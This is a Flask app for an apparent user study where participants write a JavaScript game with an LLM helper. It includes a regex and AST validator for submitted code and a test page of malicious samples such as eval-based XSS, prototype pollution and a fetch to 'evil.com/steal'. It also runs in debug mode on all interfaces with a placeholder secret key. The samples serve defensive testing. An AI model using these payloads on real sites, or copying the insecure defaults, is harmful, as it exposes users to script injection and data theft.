from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import os 
import webbrowser
from datetime import datetime
import assistant
import re
import esprima  # This actually works

class EnhancedSecurityValidator:
    def __init__(self):
        # Comprehensive security patterns for malicious code detection
        self.critical_patterns = [
            # Code injection patterns
            r'\beval\s*\(',
            r'\bnew\s+Function\s*\(',
            r'Function\s*\(\s*[\'"`]',
            r'window\s*\[\s*[\'"`]eval[\'"`]\s*\]',
            
            # Timer-based injection
            r'\bsetTimeout\s*\(\s*[\'"`]',
            r'\bsetInterval\s*\(\s*[\'"`]',
            
            # DOM manipulation
            r'document\s*\.\s*write\s*\(',
            r'document\s*\.\s*writeln\s*\(',
            r'document\s*\.\s*body\s*\.\s*innerHTML\s*=',
            r'document\s*\.\s*head\s*\.\s*innerHTML\s*=',
            
            # Prototype pollution
            r'__proto__\s*\.',
            r'constructor\s*\.\s*prototype\s*\.',
            r'Object\s*\.\s*prototype\s*\.',
            
            # Global object access
            r'\bwindow\s*\.\s*location\s*=',
            r'\bself\s*\.\s*location\s*=',
            r'\btop\s*\.\s*location\s*=',
            r'\bparent\s*\.\s*location\s*=',
            r'globalThis\s*\.',
            
            # Storage access
            r'\blocalStorage\s*\.',
            r'\bsessionStorage\s*\.',
            
            # Network/import patterns
            r'\bimport\s*\(',
            r'\bfetch\s*\(',
            r'\bnew\s+XMLHttpRequest\s*\(',
            r'\brequire\s*\(',
            
            # Dangerous global access
            r'\bprocess\s*\.',
            r'\bglobal\s*\.',
            
            # Obfuscation patterns
            r'\\u[0-9a-fA-F]{4}.*\\u[0-9a-fA-F]{4}.*\\u[0-9a-fA-F]{4}', # Unicode obfuscation
            r'\\x[0-9a-fA-F]{2}.*\\x[0-9a-fA-F]{2}.*\\x[0-9a-fA-F]{2}', # Hex obfuscation
        ]
        
        # Suspicious patterns that warrant additional scrutiny
        self.suspicious_patterns = [
            r'toString\s*\(\s*\)\s*\+',  # String coercion tricks
            r'valueOf\s*\(\s*\)',         # Value coercion tricks
            r'\+\s*\[\s*\]',              # Array coercion tricks
            r'\[\s*\]\s*\+',              # More coercion tricks
            r'this\s*\[\s*[\'"`]',        # Dynamic property access
            r'arguments\s*\.',            # Arguments object manipulation
        ]
          # Maximum allowed code size (50KB)
        self.max_code_size = 50000
        
        # Maximum string concatenations (to detect obfuscation)
        self.max_string_concats = 15
    
    def validate(self, code):
        violations = []
        
        # Size check
        if len(code) > self.max_code_size:
            violations.append(f"Code too large: {len(code)} bytes (max {self.max_code_size})")
        
        # String concatenation obfuscation check
        concat_count = len(re.findall(r'[\'"][^\'"]*\+', code))
        if concat_count > self.max_string_concats:
            violations.append(f"Excessive string concatenation detected: {concat_count} (max {self.max_string_concats})")
        
        # Critical pattern matching
        for pattern in self.critical_patterns:
            matches = re.findall(pattern, code, re.IGNORECASE)
            if matches:
                violations.append(f"Critical security violation - Pattern: {pattern}, Matches: {len(matches)}")
        
        # Suspicious pattern detection (warnings)
        suspicious_warnings = []
        for pattern in self.suspicious_patterns:
            matches = re.findall(pattern, code, re.IGNORECASE)
            if matches:
                suspicious_warnings.append(f"Suspicious pattern - {pattern}: {len(matches)} occurrences")
        
        # Enhanced AST parsing with better error handling
        ast_violations = []
        try:
            ast = esprima.parseScript(code)
            ast_violations = self._check_ast_comprehensive(ast)
        except Exception as e:
            # Don't automatically fail on parse errors - some valid code might not parse
            ast_violations.append(f"Code parsing warning: {str(e)}")
        
        violations.extend(ast_violations)
        
        # Entropy analysis for obfuscated code
        entropy_score = self._calculate_entropy(code)
        if entropy_score > 4.5:  # High entropy suggests obfuscation
            violations.append(f"High entropy detected (possible obfuscation): {entropy_score:.2f}")
        
        return {
            'is_safe': len([v for v in violations if 'warning' not in v.lower()]) == 0,
            'violations': violations,
            'warnings': suspicious_warnings,            'entropy_score': entropy_score,
            'code_size': len(code)
        }
    
    def _check_ast_comprehensive(self, ast):
        """Enhanced AST analysis for security threats"""
        violations = []
        
        def traverse(node, path="root"):
            if isinstance(node, dict):
                node_type = node.get('type', '')
                
                # Check for dangerous function calls
                if node_type == 'CallExpression':
                    callee = node.get('callee', {})
                    
                    # Direct dangerous calls
                    if callee.get('type') == 'Identifier':
                        name = callee.get('name', '')
                        if name in ['eval', 'Function', 'setTimeout', 'setInterval']:
                            # Check if setTimeout/setInterval uses string argument
                            if name in ['setTimeout', 'setInterval']:
                                args = node.get('arguments', [])
                                if args and args[0].get('type') == 'Literal':
                                    violations.append(f"String-based {name} detected at {path}")
                            else:
                                violations.append(f"Dangerous function call: {name} at {path}")
                    
                    # Member expressions (e.g., window.eval, obj.constructor)
                    elif callee.get('type') == 'MemberExpression':
                        obj = callee.get('object', {})
                        prop = callee.get('property', {})
                        
                        if (obj.get('name') == 'window' and 
                            prop.get('name') in ['eval', 'Function']):
                            violations.append(f"Window-based dangerous call at {path}")
                        
                        if (obj.get('name') == 'document' and 
                            prop.get('name') in ['write', 'writeln']):
                            violations.append(f"Document manipulation at {path}")
                
                # Check for prototype pollution attempts
                elif node_type == 'MemberExpression':
                    prop = node.get('property', {})
                    if (prop.get('name') in ['__proto__', 'constructor', 'prototype'] or
                        (prop.get('type') == 'Literal' and 
                         prop.get('value') in ['__proto__', 'constructor'])):
                        violations.append(f"Prototype access detected at {path}")
                
                # Check for assignment to dangerous properties
                elif node_type == 'AssignmentExpression':
                    left = node.get('left', {})
                    if left.get('type') == 'MemberExpression':
                        obj = left.get('object', {})
                        prop = left.get('property', {})
                        
                        # Check for location assignments
                        if (obj.get('name') in ['window', 'self', 'top', 'parent'] and
                            prop.get('name') == 'location'):
                            violations.append(f"Location assignment detected at {path}")
                        
                        # Check for innerHTML assignments
                        if prop.get('name') == 'innerHTML':
                            violations.append(f"innerHTML assignment at {path}")
                
                # Recursively traverse child nodes
                for key, value in node.items():
                    if isinstance(value, (dict, list)):
                        traverse(value, f"{path}.{key}")
                        
            elif isinstance(node, list):
                for i, item in enumerate(node):
                    if isinstance(item, (dict, list)):
                        traverse(item, f"{path}[{i}]")
        
        traverse(ast)
        return violations
    
    def _calculate_entropy(self, code):
        """Calculate Shannon entropy to detect obfuscated code"""
        import math
        from collections import Counter
        
        if not code:
            return 0
        
        # Count character frequencies
        char_counts = Counter(code)
        code_length = len(code)
        
        # Calculate entropy
        entropy = 0
        for count in char_counts.values():
            probability = count / code_length
            if probability > 0:
                entropy -= probability * math.log2(probability)
        
        return entropy

# Updated validator instance
validator = EnhancedSecurityValidator()

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "your_secret_key")

@app.route("/openexperiment", methods=["GET", "POST"])
def openexperiment():
    return redirect(url_for('gameAIassistant'))

@app.route("/gameAIassistant", methods=["GET", "POST"])
def gameAIassistant():        
    return render_template('game-AI-assistant.html')

@app.route("/")
@app.route("/index")
def index():
    return render_template('index.html')

# Add the survey route
@app.route("/opensurvey", methods=["GET", "POST"])
def opensurvey():
    consent = request.form.get('consent')
    print(f"Consent received: {consent}")  # Debugging line to check consent value
    print(f"signature: {request.form.get('signature')}")  # Debugging line to check signature value
    print(f"date: {request.form.get('date')}")  # Debugging line to check date value
    if consent == 'agree':
        return redirect(url_for('survey'))
    
@app.route("/survey")
def survey():
    return render_template('survey.html')

@app.route("/save-code", methods=["POST"])
def save_code():
    try:
        data = request.get_json()
        code = data.get("code")
        
        # Enhanced validation with detailed results
        validation_result = validator.validate(code)
        
        if not validation_result['is_safe']:
            return jsonify({
                "success": False, 
                "error": "Security violations detected",
                "violations": validation_result['violations'],
                "warnings": validation_result.get('warnings', []),
                "details": {
                    "entropy_score": validation_result.get('entropy_score', 0),
                    "code_size": validation_result.get('code_size', 0)
                }
            })
        
        # Log any warnings even if code is safe
        if validation_result.get('warnings'):
            print(f"Security warnings for code: {validation_result['warnings']}")
        
        code_lines = code.split('\n')
        print(f"Number of lines: {len(code_lines)}")

        file_name = data.get("file")
        
        # Validate file name to prevent directory traversal
        if file_name != "game.js":
            return jsonify({"success": False, "error": "Invalid file name"})

        # Save the code
        file_path = os.path.join(app.static_folder, "js", file_name)
        with open(file_path, "w", encoding="utf-8", newline='') as f:
            f.write(code)
        
        print(f"Code saved to {file_path}")
        print(f"Successfully saved {len(code_lines)} lines of code to {file_name}")
        
        return jsonify({
            "success": True,
            "validation_info": validation_result
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})
    
@app.route("/LLMrequest", methods=["POST"])
def LLMrequest():
    try:
        data = request.get_json()
        print("Received data:", data)  # Debugging line to check received data
        code = data.get("code")
        
        # Print the code received
        print("Code received for LLM request:", code)
        
        # Here you would typically process the code with your LLM and return a response
        # For now, we will just return a dummy response
        
        response = assistant.get_response().output_text  # Assuming this function interacts with the LLM
        
        response_segments = {}
        
        # Extract code between triple backticks if present
        if "```" in response:
            # Find all code blocks
            code_blocks = []
            parts = response.split("```")
            
            for i, p in enumerate(parts):
                if "javascript" in p:
                    # If the part contains 'javascript', it's likely a code block
                    #code_blocks.append(p.split("javascript")[1].strip())
                    response_segments[i] = ["code", p.split("javascript")[1].strip()]
                else:
                    # Otherwise, it's just a regular text segment
                    response_segments[i] = ["text", p.strip()]
            
            # If we found code blocks, update the response
            if code_blocks:
                response = {
                    "message": response_segments,
                    "code": code_blocks
                }
        
        print(type(response_segments))  # Ensure response is a string or dict as expected
        
        print("Response from LLM:", response_segments)  # Debugging line to check LLM response
        # response = {
        #     "message": "This is a dummy response from the LLM.",
        #     "code": code  # Echoing back the received code for demonstration
        # }
        
        reponse_list = list(response_segments.values())
        
        return jsonify(reponse_list)
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/debrief", methods=["GET", "POST"])
def debrief():
    return render_template('debrief.html')

@app.route("/security-test", methods=["POST", "GET"])
def security_test():
    """Comprehensive security testing endpoint"""
    if request.method == "GET":
        # Return test interface
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Validation Test Suite</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
                .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .test-section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
                .malicious { background-color: #ffe6e6; border-color: #ff9999; }
                .benign { background-color: #e6f7ff; border-color: #99d6ff; }
                .result { margin: 10px 0; padding: 10px; border-radius: 3px; }
                .pass { background-color: #d4edda; color: #155724; }
                .fail { background-color: #f8d7da; color: #721c24; }
                .critical { background-color: #f5c6cb; color: #721c24; font-weight: bold; }
                button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
                button:hover { background: #0056b3; }
                .stats { background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0; }
                textarea { width: 100%; height: 100px; font-family: monospace; }
                #results { max-height: 600px; overflow-y: auto; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔒 Security Validation Test Suite</h1>
                <p>This tool tests the robustness of the security validation system against various attack patterns.</p>
                
                <div class="stats" id="stats">
                    <h3>Test Statistics</h3>
                    <div id="stats-content">Click "Run All Tests" to see results</div>
                </div>
                
                <div style="margin: 20px 0;">
                    <button onclick="runAllTests()">🚀 Run All Tests</button>
                    <button onclick="runMaliciousTests()">🚨 Test Malicious Code</button>
                    <button onclick="runBenignTests()">✅ Test Benign Code</button>
                    <button onclick="testCustomCode()">🧪 Test Custom Code</button>
                </div>
                
                <div class="test-section">
                    <h3>Custom Code Test</h3>
                    <textarea id="customCode" placeholder="Enter JavaScript code to test..."></textarea>
                    <br>
                    <label><input type="checkbox" id="shouldFail"> This code should be blocked</label>
                </div>
                
                <div id="results"></div>
            </div>
            
            <script>
                const maliciousTests = [
                    {name: "Direct eval", code: 'eval("alert(\\"XSS\\")")'},
                    {name: "Function constructor", code: 'new Function("alert(\\"XSS\\")")()'},
                    {name: "setTimeout string", code: 'setTimeout("alert(\\"XSS\\")", 1000)'},
                    {name: "Document.write", code: 'document.write("<script>alert(\\"XSS\\")</script>")'},
                    {name: "Prototype pollution", code: 'Object.prototype.isAdmin = true'},
                    {name: "Window.location", code: 'window.location = "http://evil.com"'},
                    {name: "LocalStorage access", code: 'localStorage.setItem("evil", "payload")'},
                    {name: "Fetch request", code: 'fetch("http://evil.com/steal")'},
                    {name: "Unicode obfuscation", code: '\\u0065\\u0076\\u0061\\u006c("alert(1)")'},
                    {name: "Constructor prototype", code: 'var x={}; x.constructor.prototype.evil=function(){alert("pwned")}'}
                ];
                
                const benignTests = [
                    {name: "Function declaration", code: 'function test() { return 42; }'},
                    {name: "Phaser game", code: 'var game = new Phaser.Game({width: 800, height: 600});'},
                    {name: "Safe setTimeout", code: 'setTimeout(function() { console.log("safe"); }, 1000)'},
                    {name: "Math operations", code: 'var result = Math.sqrt(Math.pow(3, 2) + Math.pow(4, 2));'},
                    {name: "Array operations", code: 'var arr = [1,2,3]; arr.forEach(x => console.log(x));'}
                ];
                
                async function testCode(code, shouldFail, testName) {
                    try {
                        const response = await fetch('/security-test', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({code: code, test_name: testName})
                        });
                        const result = await response.json();
                        return {
                            name: testName,
                            shouldFail: shouldFail,
                            actualResult: !result.is_safe,
                            passed: shouldFail === !result.is_safe,
                            violations: result.violations || [],
                            details: result
                        };
                    } catch (error) {
                        return {
                            name: testName,
                            shouldFail: shouldFail,
                            actualResult: true,
                            passed: shouldFail,
                            error: error.message
                        };
                    }
                }
                
                async function runAllTests() {
                    document.getElementById('results').innerHTML = '<h3>Running tests...</h3>';
                    const results = [];
                    
                    // Test malicious code
                    for (const test of maliciousTests) {
                        const result = await testCode(test.code, true, test.name);
                        results.push(result);
                    }
                    
                    // Test benign code
                    for (const test of benignTests) {
                        const result = await testCode(test.code, false, test.name);
                        results.push(result);
                    }
                    
                    displayResults(results);
                }
                
                async function runMaliciousTests() {
                    document.getElementById('results').innerHTML = '<h3>Testing malicious code...</h3>';
                    const results = [];
                    
                    for (const test of maliciousTests) {
                        const result = await testCode(test.code, true, test.name);
                        results.push(result);
                    }
                    
                    displayResults(results);
                }
                
                async function runBenignTests() {
                    document.getElementById('results').innerHTML = '<h3>Testing benign code...</h3>';
                    const results = [];
                    
                    for (const test of benignTests) {
                        const result = await testCode(test.code, false, test.name);
                        results.push(result);
                    }
                    
                    displayResults(results);
                }
                
                async function testCustomCode() {
                    const code = document.getElementById('customCode').value;
                    const shouldFail = document.getElementById('shouldFail').checked;
                    
                    if (!code.trim()) {
                        alert('Please enter some code to test');
                        return;
                    }
                    
                    const result = await testCode(code, shouldFail, 'Custom Test');
                    displayResults([result]);
                }
                
                function displayResults(results) {
                    const passed = results.filter(r => r.passed).length;
                    const failed = results.filter(r => !r.passed).length;
                    const maliciousBlocked = results.filter(r => r.shouldFail && r.actualResult).length;
                    const maliciousTotal = results.filter(r => r.shouldFail).length;
                    const benignAllowed = results.filter(r => !r.shouldFail && !r.actualResult).length;
                    const benignTotal = results.filter(r => !r.shouldFail).length;
                    
                    // Update stats
                    document.getElementById('stats-content').innerHTML = `
                        <div><strong>Total Tests:</strong> ${results.length}</div>
                        <div><strong>Passed:</strong> ${passed} (${(passed/results.length*100).toFixed(1)}%)</div>
                        <div><strong>Failed:</strong> ${failed} (${(failed/results.length*100).toFixed(1)}%)</div>
                        <div><strong>Malicious Blocked:</strong> ${maliciousBlocked}/${maliciousTotal} (${(maliciousBlocked/maliciousTotal*100).toFixed(1)}%)</div>
                        <div><strong>Benign Allowed:</strong> ${benignAllowed}/${benignTotal} (${(benignAllowed/benignTotal*100).toFixed(1)}%)</div>
                    `;
                    
                    // Display individual results
                    let html = '<h3>Test Results</h3>';
                    results.forEach(result => {
                        const statusClass = result.passed ? 'pass' : (result.shouldFail && !result.actualResult ? 'critical' : 'fail');
                        const statusText = result.passed ? 'PASS' : 'FAIL';
                        const expected = result.shouldFail ? 'BLOCK' : 'ALLOW';
                        const actual = result.actualResult ? 'BLOCKED' : 'ALLOWED';
                        
                        html += `
                            <div class="result ${statusClass}">
                                <strong>${statusText}</strong> - ${result.name}<br>
                                Expected: ${expected}, Actual: ${actual}<br>
                                ${result.violations.length > 0 ? `Violations: ${result.violations.join(', ')}<br>` : ''}
                                ${result.error ? `Error: ${result.error}<br>` : ''}
                            </div>
                        `;
                    });
                    
                    document.getElementById('results').innerHTML = html;
                }
            </script>
        </body>
        </html>
        """
    
    else:  # POST request - run security test
        try:
            data = request.get_json()
            code = data.get("code", "")
            test_name = data.get("test_name", "Unknown Test")
            
            # Run validation
            validation_result = validator.validate(code)
            
            # Log test result
            print(f"Security test '{test_name}': {'BLOCKED' if not validation_result['is_safe'] else 'ALLOWED'}")
            if validation_result['violations']:
                print(f"  Violations: {validation_result['violations']}")
            
            return jsonify(validation_result)
            
        except Exception as e:
            print(f"Security test error: {str(e)}")
            return jsonify({
                'is_safe': False,
                'violations': [f"Test execution error: {str(e)}"],
                'warnings': [],
                'entropy_score': 0,
                'code_size': 0
            })

@app.route("/security-test-ui")
def security_test_ui():
    """Serve the security testing dashboard"""
    return render_template('security-test.html')

if __name__ == "__main__":
    if os.environ.get('WERKZEUG_RUN_MAIN') == 'true':
        webbrowser.open('http://127.0.0.1:5001')
    #app.run(debug=True, port=5001)
    app.run(host='0.0.0.0', debug=True, port=5001)
